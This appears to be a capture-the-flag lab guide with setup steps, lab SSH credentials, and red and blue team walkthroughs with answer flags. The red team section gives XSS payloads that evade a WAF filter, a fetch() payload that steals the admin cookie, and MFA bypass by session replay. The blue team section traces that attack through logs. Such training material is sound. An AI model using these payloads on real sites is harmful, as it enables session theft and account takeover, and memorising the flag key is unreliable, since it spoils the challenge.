Environment

DNS name: feedback.admin.local

Application Port: 3075

SSH Port: 2275

Blue Team SSH Credentials:
-	Username: analyst
-	Password: blue_team_rocks
________________________________________
Deployment (Proxmox)

Step 1

Create a Linux VM.

Recommended:
- Debian 12
- 2 GB RAM
- 2 vCPU
- 20 GB Disk
________________________________________
Step 2

Copy the project to the VM.
________________________________________
Step 3

Run provisioning.

sudo bash setup-vm.sh
________________________________________
Step 4

Start the lab.

docker compose up -d –build
________________________________________
Step 5:

Verify.

Open: http://:3075

SSH: ssh analyst@ -p 2275

________________________________________

Red Team Walkthrough

Phase 1: Reconnaissance

Step 1: Identify the Backend Technology
- Visit http://localhost:3075/
- Use DevTools Network tab or: curl -I http://localhost:3075/
- Check the resulting header: X-Powered-By: Node.js
Flag: SCENARIO75{Node.js}

Step 2: Enumerate Cookies
- Open Developer Tools → Storage/Application → Cookies
- Cookie should contain the followings:
Name = pre_mfa_session
Value =pending_mfa_verification
HttpOnly = false
Flags:
SCENARIO75{pre_mfa_session}
SCENARIO75{pending_mfa_verification}
SCENARIO75{False}

Step 3: View Page Source
- View Page Source
- Locate hint pointing to robots.txt
Flag: SCENARIO75{robots.txt}

Step 4: Inspect robots.txt
- Visit http://localhost:3075/robots.txt
- You can find the following line= Disallow: /api/verify-mfa
Flag: SCENARIO75{/api/verify-mfa}

Step 5: Investigate Hidden Endpoint
- Visit http://localhost:3075/api/verify-mfa
- JSON response should reveal: /dashboard
Flag: SCENARIO75{/dashboard}

Phase 2: WAF & XSS

Step 6: Determine the Submission Method
- Inspect form source
- Discover method="POST"
Flag: SCENARIO75{POST}

Step 7: Verify WAF Behavior
- In the main page feedback input. Submit: <script>alert(1)</script>
- Results in HTTP 403 Forbidden
Flag: SCENARIO75{403}

Step 8: Identify a WAF Bypass
- Test again by inputting:  <svg onload=alert(1)>
- Payload accepted
Flag: SCENARIO75{<svg>}

Step 9: Analyze Cookie Access Filtering
- Test cookie filtering by inputting: <svg onload=alert(document.cookie)>
- Observe block due to document.cookie filtering

Step 10: Bypass Cookie Filtering
- Use: window['docu'+'ment']['coo'+'kie']
- It should result in block not triggered

Flag: SCENARIO75{window['docu'+'ment']['coo'+'kie']}

Step 11: Discover the Telemetry Feature
- Note hint on admin-review:
  New client-side fetcher API deployed. Analytics integration enabled.

Step 12: Verify Fetch API Usage
Submit:
<svg onload="
fetch('/api/collect',{
method:'POST',
headers:{'Content-Type':'application/json'},
body:JSON.stringify({test:'fetch works'})
})
">
- Trigger via /admin-review
- Observe response from collector
Flag: SCENARIO75{fetch}

Step 13: Build the Final Payload
Submit:
<svg onload="
fetch('/api/collect',{
method:'POST',
headers:{'Content-Type':'application/json'},
body:JSON.stringify({
stolenCookie:window['docu'+'ment']['coo'+'kie']
})
})
">

Step 14: Trigger Execution
- Visit /admin-review
- Admin cookie becomes available: adm_sess_cookie=adm_sess_super_admin

Step 15: Retrieve Exfiltrated Data
- Visit: http://localhost:3075/analytics
- Observe stolenCookie entry

Step 16: Identify Session Format
- Observe: adm_sess_super_admin
Flag: SCENARIO75{adm_sess}

Phase 3: MFA Bypass & Session Replay

Step 17: Replay the Session Cookie
Create cookie:
Name: adm_sess_cookie
Value: adm_sess_super_admin

Step 18: Access the Dashboard
- Visit: http://localhost:3075/dashboard
- MFA is bypassed via session replay

Step 19: Confirm XSS Reach
- Inspect html and locate: <div class="xss-payload">
Flag: SCENARIO75{xss-payload}

Step 20: Capture the Final Flag
SCENARIO75{RED_C00k13_MFA_Byp4ss_0wn3d}

Blue Team Walkthrough

Phase 1: Log Forensics

Step 1: Identify the Attacker’s IP Address

Open:
opt/admin/logs/access.log

Review the requests that do not originate from normal administrative activity.

Example entries:

10.10.14.50 - - [15/Jul/2025:18:50:05 +0000] "GET / HTTP/1.1" 200 1201 "-" "Mozilla/5.0"

10.10.14.50 - - [15/Jul/2025:18:50:08 +0000] "GET /robots.txt HTTP/1.1" 200 93 "-" "Mozilla/5.0"

The attacker IP is:
10.10.14.50

Flag:
SCENARIO75{10.10.14.50}
________________________________________
Step 2: Identify the User-Agent

Inspect the same entries.

Observe:
Mozilla/5.0

Flag:
SCENARIO75{Mozilla/5.0}
________________________________________
Step 3: Determine When Dashboard Access Was Achieved

Search for dashboard requests:
grep "/dashboard" access.log
Results:

10.10.14.50 - - [15/Jul/2025:18:50:10 +0000] "GET /dashboard HTTP/1.1" 401 93 "-" "Mozilla/5.0"

10.10.14.50 - - [15/Jul/2025:18:51:55 +0000] "GET /dashboard HTTP/1.1" 200 4048 "-" "Mozilla/5.0" "X-Forwarded-For: UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0"

The first successful access occurred at:
18:51:55

Flag:
SCENARIO75{18:51:55}

The HTTP status code was:
200

Flag:
SCENARIO75{200}
________________________________________
Step 4: Locate the Suspicious Header Value

Observe the successful dashboard request:

X-Forwarded-For:
UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0

Flag:
SCENARIO75{UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0}

This value appears encoded and should be investigated further.
________________________________________
Phase 2: Threat Hunting

Step 1: Establish Normal Activity

Review requests originating from:
192.168.1.100

Examples:

192.168.1.100 - - [15/Jul/2025:18:49:00 +0000] "GET /dashboard HTTP/1.1" 200 3421 "-" "Mozilla/5.0"

192.168.1.100 - - [15/Jul/2025:18:49:30 +0000] "GET /admin-review HTTP/1.1" 200 1820 "-" "Mozilla/5.0"

This represents legitimate administrative traffic.

Flag:
SCENARIO75{192.168.1.100}
________________________________________
Step 2: Determine the Attacker’s Subnet

Attacker address:
10.10.14.50

Network:
10.10.14.0/24

Flag:
SCENARIO75{10.10.14.0/24}
________________________________________
Step 3: Locate the First WAF Event

Open:
opt/admin/logs/error.log

Flag:
SCENARIO75{/opt/admin/logs/error.log}

Observe:

[18:50:15] WAF: blocked payload containing <script> from IP 10.10.14.50

Timestamp:
18:50:15

Flag:
SCENARIO75{18:50:15}

Blocked payload:
<script>
  
Flag:
SCENARIO75{<script>}
________________________________________
Step 4: Verify MFA Endpoint Usage
  
Search for references to:

/api/verify-mfa
  
Example:

grep "verify-mfa" access.log
  
Result:
No matches
  
The attacker never accessed the MFA verification endpoint.
  
Flag:
SCENARIO75{No}
  
This indicates MFA was bypassed rather than completed.
________________________________________
Phase 3: Incident Response
  
Step 1: Analyze the Encoded Header
  
Investigate:
UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0
  
The character set:

A-Z
  
a-z
  
0-9
  
+
  
/
  
is characteristic of:
Base64
  
Flag:
SCENARIO75{Base64}
________________________________________
Step 2: Identify Critical Security Events
  
Review:

[18:51:58] CRITICAL: Cookie reuse detected from IP 10.10.14.50 using adm_sess_cookie
  
Severity level:
CRITICAL
  
Flag:
SCENARIO75{CRITICAL}
  
Interpretation:

A previously issued administrative session cookie was reused by another client.
________________________________________
Step 3: Locate Authentication Bypass Evidence
  
Observe:

[18:53:10] WARNING: Authentication bypass anomaly
  
Timestamp:
18:53:10
  
Flag:
SCENARIO75{18:53:10}
  
Warning text:
Authentication bypass anomaly
  
Flag:
SCENARIO75{Authentication bypass anomaly}
  
This confirms that an authentication workflow was circumvented.
________________________________________
Step 4: Decode the Header Value
  
Decode:
UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0
  
Using:
echo "UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0" | base64 -d
  
Result:

PHANTOMGRID{BLUE_L0G_HUnt3r_M4st3r}
  
The challenge flag is:
SCENARIO75{BLUE_L0G_HUnt3r_M4st3r}
________________________________________
